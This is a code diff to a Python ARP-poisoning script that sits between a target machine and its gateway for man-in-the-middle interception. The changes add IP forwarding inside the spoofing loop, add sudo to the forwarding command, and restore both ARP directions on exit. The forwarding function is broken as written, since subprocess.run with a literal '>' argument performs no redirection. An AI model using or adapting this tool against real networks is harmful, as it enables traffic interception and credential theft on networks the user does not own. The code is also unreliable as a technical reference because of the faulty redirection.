@@ -5,7 +5,7 @@ import optparse
 
 
 def ipForward():
-    subprocess.run(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
+    subprocess.run(["sudo","echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
 
 def getUserInput():
     parseObject = optparse.OptionParser()
@@ -53,7 +53,7 @@ userGatewayIP = userIP.gatewayIP
 
 try:
     while True:
-
+        ipForward()
         arpPoisoning(userTargetIP,userGatewayIP)
         arpPoisoning(userGatewayIP,userTargetIP)
 
@@ -65,4 +65,4 @@ try:
 except KeyboardInterrupt:
     print("\nQuit & Reset")
     reset(userTargetIP,userGatewayIP)
-    
+    reset(userGatewayIP,userTargetIP)
